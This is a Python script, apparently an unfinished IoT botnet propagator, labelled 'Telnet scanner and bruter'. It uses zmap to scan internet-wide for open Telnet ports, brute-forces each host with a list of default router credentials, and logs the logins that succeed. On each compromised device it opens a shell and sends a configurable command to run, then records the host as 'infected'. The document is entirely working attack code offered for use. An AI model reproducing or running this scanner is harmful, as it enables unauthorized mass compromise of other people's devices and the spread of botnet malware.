#Merlyns Telnet scanner and bruter Work in progress
#!/usr/bin/python
import threading
import sys
import os
import time
import random
import socket
import select
import subprocess

# Command to execute on the target system
COMMAND = ""

# List of default credentials to try
DEFAULT_CREDS = [
    "root:root",
    "root:",
    "admin:admin",
    "telnet:telnet",
    "support:support",
    "user:user",
    "admin:",
    "admin:password",
    "root:admin",
    "mother:fucker"
]

# Timeout for socket operations
SOCKET_TIMEOUT = 8

def read_until(sock, string, timeout=8):
    """Read until the specified string is encountered."""
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += sock.recv(1024)
        time.sleep(0.1)
        if string in buf:
            return buf
    raise Exception('TIMEOUT!')

def recv_timeout(sock, size, timeout=8):
    """Receive data with timeout."""
    sock.setblocking(0)
    ready = select.select([sock], [], [], timeout)
    if ready[0]:
        data = sock.recv(size)
        return data
    return ""

class Router(threading.Thread):
    def __init__(self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')

    def run(self):
        global fh
        for creds in DEFAULT_CREDS:
            username, password = creds.split(":")
            try:
                tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tn.settimeout(1)
                tn.connect((self.ip, 23))
            except Exception:
                tn.close()
                break
            try:
                tempus = ''
                tempus += read_until(tn, ":")
                if ":" in tempus:
                    tn.send(username + "\r\n")
                    time.sleep(0.1)
                else:
                    tn.close()
                    return

                tempus = ''
                tempus += read_until(tn, ":")
                if ":" in tempus:
                    tn.send(password + "\r\n")
                    time.sleep(0.1)
                else:
                    tn.close()
                    return

                prompt = ''
                prompt += recv_timeout(tn, 40960)
                if "#" in prompt or "$" in prompt:
                    success = True
                else:
                    success = False
                    tn.close()
                if success:
                    try:
                        fh.write("{}:23 {}:{}\n".format(self.ip, username, password))
                        fh.flush()
                        tn.send("sh\r\n")
                        time.sleep(0.1)
                        tn.send("shell\r\n")
                        time.sleep(0.1)
                        tn.send("ls /\r\n")
                        time.sleep(1)
                        timeout = SOCKET_TIMEOUT
                        buf = ''
                        start_time = time.time()
                        while time.time() - start_time < timeout:
                            buf += recv_timeout(tn, 40960)
                            time.sleep(0.1)
                            if "tmp" in buf and "unrecognized" not in buf:
                                tn.send(COMMAND + "\r\n")
                                f = open("infected.txt", "a")
                                fh.write("{}:23 {}:{}\n".format(self.ip, username, password))
                                f.close()
                                time.sleep(10)
                                tn.close()
                                return
                        tn.close()
                        return
                    except:
                        tn.close()
                else:
                    tn.close()
            except:
                tn.close()

def worker():
    while True:
        cmd = "zmap -p23 -N 10000 -f saddr -q --verbosity=0"
        process = subprocess.Popen(cmd.split(" "), stdout=subprocess.PIPE)
        for line in iter(process.stdout.readline, ''):
            line = line.replace("\n", "")
            threadstarted = False
            while not threadstarted:
                try:
                    thread = Router(line)
                    thread.start()
                    threadstarted = True
                except:
                    pass

global fh
fh = open(sys.argv[2], "a")
for l in xrange(int(sys.argv[1])):
    try:
        t = threading.Thread(target=worker)
        t.start()
    except:
        pass

print("Started {} scanner threads! Press enter to stop.".format(sys.argv[1]))
input()
os.kill(os.getpid(), 9)